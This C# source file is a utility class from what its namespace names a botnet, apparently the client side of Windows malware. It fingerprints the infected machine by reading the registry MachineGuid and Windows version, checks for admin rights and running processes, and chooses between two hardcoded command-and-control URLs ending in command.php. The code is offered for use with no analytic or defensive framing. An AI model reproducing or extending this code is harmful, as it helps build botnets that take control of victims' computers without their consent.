using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

namespace BotNet.Services.Common
{
    class Factory
    {
        public bool CheckProcess(string procName)
        {
            var runningProcs = from proc in Process.GetProcesses(".") orderby proc.Id select proc;
            if (runningProcs.Count(p => p.ProcessName.ToUpper().Contains(procName)) > 0)
            {
                return true;
            }

            return false;
        }

        public bool CheckFile(string filePath)
        {
            if (File.Exists(filePath))
                return true;
            return false;
        }

        public string GenString(int length)
        {
            Random r = new Random();
            string chars = "qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM";
            string ret = chars[r.Next(10, chars.Length)].ToString();
            for (int i = 1; i < length; i++)
                ret += chars[r.Next(chars.Length)];
            return ret;
        }

        [DllImport("kernel32.dll", EntryPoint = "SetProcessWorkingSetSize", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]

        private static extern int SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);
        public void FlushMemory()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        }
        public string GetMachineGuid()
        {
            string location = @"SOFTWARE\Microsoft\Cryptography";
            string name = "MachineGuid";

            using (RegistryKey localMachineX64View =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey rk = localMachineX64View.OpenSubKey(location))
                {
                    object machineGuid = rk.GetValue(name);
                    return machineGuid.ToString();
                }
            }
        }

        public string GetWinVersion()
        {
            string key = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            using (RegistryKey regKey = Registry.LocalMachine.OpenSubKey(key))
            {
                if (regKey != null)
                {
                    try
                    {
                        string name = regKey.GetValue("ProductName").ToString();
                        if (name == "") return "значение отсутствует";
                        if (name.Contains("XP"))
                            return "XP";
                        else if (name.Contains("7"))
                            return "Windows 7";
                        else if (name.Contains("8"))
                            return "Windows 8";
                        else if (name.Contains("10"))
                            return "Windows 10";
                        else
                            return "Uknown Version";
                    }
                    catch {}
                }
                else
                    return "Не удалось получить значение ключа в реестре";
            }

            return "Uknown Version";
        }

        public bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public string GetServerAddress()
        {
            return testSite(@"https://pizza-joke.000webhostapp.com/command.php") ? @"https://pizza-joke.000webhostapp.com/command.php" : @"http://f0192260.xsph.ru/command.php";
        }
        private bool testSite(string url)
        {

            Uri uri = new Uri(url);
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)HttpWebRequest.Create(uri);
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
